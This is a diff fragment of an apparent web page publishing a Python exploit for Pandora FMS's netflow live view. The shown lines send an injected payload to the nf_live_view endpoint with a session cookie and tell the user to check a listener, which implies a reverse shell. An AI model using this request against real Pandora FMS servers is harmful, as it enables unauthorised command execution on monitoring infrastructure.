@@ -207,12 +207,6 @@ if exploit.status_code == 200:
 	print "[+] Everything seems ok, check your listener."
 else:
 	print "[-] Exploit failed. You can change position of payload to ip_src, dst_port or src_port and try again."
-
-exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
-'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
-'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-'Accept-Encoding':'gzip, deflate',
-'Content-Type':'application/x-www-form-urlencoded'})
 </pre></div><br>
 	   
 <video id="PANDORAFMS exploitation" class="video-js vjs-default-skin" controls
